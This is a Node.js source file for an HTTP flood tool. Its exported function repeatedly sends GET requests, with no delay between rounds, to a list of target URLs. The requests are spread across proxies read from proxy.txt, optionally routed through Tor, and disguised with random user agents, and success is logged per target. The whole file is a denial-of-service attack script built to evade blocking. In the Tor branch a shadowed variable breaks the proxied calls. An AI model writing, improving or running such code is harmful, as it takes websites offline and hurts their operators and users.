const proxy =         require('tor-request');
const request =       require('request');
const fs =             require('fs').promises;
const randomUseragent = require('random-useragent');

module.exports = async ({ urls, tor, setState }) => {
    let proxyList = (await fs.readFile('proxy.txt', 'utf8')).split('\n');

    setInterval(async () => proxyList = (await fs.readFile('proxy.txt', 'utf8')).split('\n'), 60000);

    const attack = (method, url, proxy) => {
        try {
            const params = {
                url,
                method: 'GET',
                headers: {
                    'User-Agent': randomUseragent.getRandom()
                }
            };
    
            if (proxy) params.proxy = `http://${proxy}`;
    
            return method(params, (err, res) => {
                if (err) return setState({ url, success: 'unsuccessfully' });
                if (res?.statusCode && res?.statusCode < 400) setState({ url, success: 'successfully' });
            });
        } catch(err) {
            return setState({ url, success: 'unsuccessfully' });
        }
    }
    
    if (tor) {
        setInterval(() => {
            for (const url of urls) {
                attack(proxy.request, url);

                if (proxyList?.length) for (const proxy of proxyList) {
                    attack(proxy.request, url, proxy);
                }
            };

            return;
        });
    } else {
        setInterval(() => {
            for (const url of urls) {
                attack(request, url);

                if (proxyList?.length) for (const proxy of proxyList) {
                    attack(request, url, proxy);
                }
            }

            return;
        });
    }
};

